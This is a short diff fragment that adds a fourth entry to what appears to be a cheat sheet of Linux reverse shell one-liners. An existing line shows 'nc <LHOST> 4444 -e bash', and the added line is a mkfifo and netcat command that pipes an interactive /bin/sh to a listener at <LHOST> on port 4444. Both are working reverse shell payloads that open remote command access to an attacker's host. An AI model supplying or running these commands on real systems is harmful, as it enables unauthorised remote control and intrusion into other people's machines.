@@ -50,6 +50,8 @@ Linux Shells:
 
 [3] nc <LHOST> 4444 -e bash
 
+[4] rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f
+
 ---
 M
 ---
